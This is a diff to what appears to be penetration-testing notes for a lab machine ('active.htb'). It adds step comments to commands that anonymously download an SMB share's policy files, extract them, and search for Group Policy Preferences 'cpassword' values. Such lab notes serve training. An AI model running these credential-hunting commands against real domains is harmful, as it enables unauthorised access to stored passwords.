@@ -75,8 +75,13 @@ mget *               # Download everything matching the mask
 mask "*"             # reset mask at the end.
 
 # With the folder context
+# Step 1: Download SMB share contents as tar archive
 smbclient //10.10.10.100/Replication -N -D 'active.htb\Policies' -Tc /home/kali/loot/policies.tar '*'
+
+# Step 2: Extract the archive into a structured folder
 tar -xf /home/kali/loot/policies.tar -C /home/kali/loot/policies_tree
+
+# Step 3: Hunt for encrypted GPP passwords recursively
 grep -Rni 'cpassword' /home/kali/loot/policies_tree
 
 ```
